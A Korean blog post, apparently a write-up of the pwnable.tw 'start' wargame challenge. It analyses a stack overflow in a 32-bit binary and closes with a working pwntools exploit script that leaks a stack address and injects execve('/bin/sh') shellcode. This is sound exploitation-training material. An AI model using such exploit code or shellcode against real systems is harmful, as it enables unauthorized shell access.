---
layout: post
title: pwnable.tw - start Write Up
tags: [pwnable, writeup, wargame]
---



## Analysis

![1](https://user-images.githubusercontent.com/23413308/45689125-1bbe3300-bb8e-11e8-81ee-a584c7fd97e0.png)

32bit 리눅스 파일이고 stripped은 걸려있지 않습니다.



![2](https://user-images.githubusercontent.com/23413308/45689176-3f817900-bb8e-11e8-8325-3a8db2981354.png)

start 문제임에 걸맞게(?) 보호 기법도 아무것도 걸려있지 않네요.

스트립 되어있지 않으니 objdump를 통해 어셈을 한 번 봐봅시다.





![3](https://user-images.githubusercontent.com/23413308/45689205-5627d000-bb8e-11e8-92a8-2ec0e395c827.png)

_start와 _exit로 구성되어 있고 int 0x80 들을 보니 sys_call을 통해서 프로그램이 동작하고 있는 것 같습니다.

_start 함수에 0x804808f 부분의 호출은 0x4번 이므로 sys_write, 0x8048097 부분의 호출은 0x3번이므로 sys_read네요.

sys_write를 호출 하기 전에 push를 많이 해주는 것을 보아 저 부분에서 문자열을 push 해준 후 0x3c만큼 입력을 받는 프로그램이네요.

한 번 실행을 해봅시다.



![4](https://user-images.githubusercontent.com/23413308/45689271-87a09b80-bb8e-11e8-86d1-ea3847cd320b.png)

push 해줬던 부분은 Let's start the CTF: 부분이겠고 입력을 받은 후에는 그냥 종료되네요.

gdb를 붙여서 어떤 식으로 exploit을 할 수 있을지 봅니다.



![5](https://user-images.githubusercontent.com/23413308/45689305-9e46f280-bb8e-11e8-8a76-448dc491fa6c.png)

입력을 받은 직후인 add esp, 0x14 부분에 브레이크 포인트를 걸고 실행을 해봅시다.

stack 부분을 보면 esp+0x14에 _exit 함수의 주소가 있는 것이 보이네요. esp+0x14 후 ret 이니 _exit 함수가 호출되면서 종료되는 것 같습니다.

그러면 저 부분을 조작할 수 있으면 익스플로잇이 가능하겠군요!





![6](https://user-images.githubusercontent.com/23413308/45689363-be76b180-bb8e-11e8-82c0-04154a8d9ae0.png)

esp 부분을 보면 입력한 A가 10개 들어있고 그 다음에 0x0804809d가 있습니다. 해당 부분은 _exit의 주소네요.

저 부분을 수정하면 eip를 조종할 수 있을 것 같습니다. 그리고 바로 뒤에 0xffffd710은 stack 부분의 주소네요.

일단 eip 조종이 가능한지 확인을 해봅니다.





![7](https://user-images.githubusercontent.com/23413308/45689416-e239f780-bb8e-11e8-821e-17b715274f7f.png)

본래 _exit 주소가 있던 부분을 A로 덮었더니 eip가 0x41414141로 바뀌었습니다. 그렇다면.. 어떻게 익스플로잇을 할까요?



프로그램이 동작하는 것을 요약하면

1. 문자열을 푸시한다.
2. sys_write를 통해 푸시한 문자열을 출력한다.
3. sys_read를 통해 사용자 입력을 받는다.
4. esp+0x14 부분의 명령을 실행한다.



그렇다면 esp+0x14 부분(_exit 함수가 있는 부분)을 write를 호출하는 부분으로 덮어씌우면 stack의 주소가 sys_write를 통해 출력이 되고 sys_read가 호출이 됩니다.



![8](https://user-images.githubusercontent.com/23413308/45689499-14e3f000-bb8f-11e8-84c3-a47c5a3d9d0d.png)

이 사진을 통해 설명하면 0xffffd710 부분이 leak이 되고 현재 esp는 0xffffd710를 가리키겠죠?

read를 통해 입력을 받으면 0xffffd710 부분이 채워지게 되고 esp+0x14 부분이 eip가 됩니다.



어떻게 익스할 지 보면

1. 첫 번째 _exit를 write 주소로 바꿔서 stack_addr leak
2. leak된 주소부터 다시 똑같은 상황이 발생하므로 eip 컨트롤 가능
3. eip 컨트롤을 해준 후 뒷 부분에 shellcode를 넣고 eip가 그곳을 가리키게 하면 된다!

입니다.



설명이 너무 주저리주저리여서.. 이해가 안되시면 밑에 exploit 코드와 해당 문제의 어셈 코드 및 스택 구조를 따라가보면 이해가 되실 겁니다.



## exploit code

```python
from pwn import *

r = remote("chall.pwnable.tw", 10000)
r.recv()
r.send("A"*20 + p32(0x08048087))

stack_addr = u32(r.recv(4))

print "stack_addr : " + hex(stack_addr)

shellcode = asm("xor ecx, ecx")
shellcode += asm("mul ecx")
shellcode += asm("push ecx")
shellcode += asm("push 0x68732f2f")
shellcode += asm("push 0x6e69622f")
shellcode += asm("mov ebx, esp")
shellcode += asm("mov al, 11")
shellcode += asm("int 0x80")

r.send("A"*20 + p32(stack_addr + 0x14) + shellcode)

r.interactive()
```



![9](https://user-images.githubusercontent.com/23413308/45689698-9b98cd00-bb8f-11e8-8cf9-10cb38621c43.png)

